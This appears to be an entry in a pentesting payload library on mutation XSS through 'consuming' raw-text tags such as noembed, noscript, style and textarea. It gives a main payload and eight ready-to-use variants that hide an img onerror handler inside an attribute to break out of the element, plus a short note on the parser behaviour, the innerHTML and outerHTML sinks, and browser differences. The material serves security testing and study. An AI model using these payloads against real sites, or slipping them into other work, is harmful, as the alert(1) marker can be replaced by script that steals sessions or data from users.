---
title: Consuming Tag mXSS (Parser Confusion)
slug: consuming-tag-mxss
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/innerHTML, sink/mxss]
inbound: []
---

# Consuming Tag mXSS (Parser Confusion)

## Payload

```html
<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
```

## Variants

```html
<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>
<style><img title="</style><img src onerror=alert(1)>"></style>
<script><img title="</script><img src onerror=alert(1)>"></script>
<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>
<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>
<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>
<title><img title="</title><img src onerror=alert(1)>"></title>
```

## Context

These exploit HTML's raw-text element model: tags like `<noembed>`, `<noscript>`, `<style>`, `<script>`, `<xmp>`, `<textarea>`, `<noframes>`, `<title>` treat their body as raw text until the exact close-tag sequence is seen. An injected payload that opens one of these tags can swallow the application's closing attribute quote and angle brackets, causing the parser to reinterpret everything after the consuming tag's close as HTML. The inner `<img src onerror=alert(1)>` then fires. Sink: `innerHTML`, `outerHTML`, or direct HTML reflection. Browser-specific — test Chrome vs Firefox separately, as parsing rules differ slightly.

## Provenance

- Distilled from: `../../techniques/dom-xss/consuming-tags-and-hoisting.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Consuming Tags and Hoisting](../../techniques/dom-xss/consuming-tags-and-hoisting.md)
- [onerror Resource Load](../../payloads/dom-xss/onerror-resource-load.md)
